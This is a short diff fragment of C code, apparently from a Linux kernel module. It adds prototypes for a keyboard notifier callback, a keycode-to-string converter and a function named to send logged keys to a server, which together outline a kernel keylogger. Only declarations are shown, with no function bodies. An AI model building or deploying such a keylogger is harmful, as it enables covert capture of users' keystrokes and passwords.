@@ -75,6 +75,12 @@ const struct file_operations keys_fops = {
 	.read = keys_read,
 };
 
+// Functions prototypes
+int epikeylog_cb(struct notifier_block *nblock, unsigned long code, void *_param);
+void keycode_to_string(int keycode, int shift_mask, char *buf, int type);
+int epikeylog_exit(void);
+int epikeylog_send_to_server(void);
+
 /**
  * keys_read - read function for @file_operations structure
  */
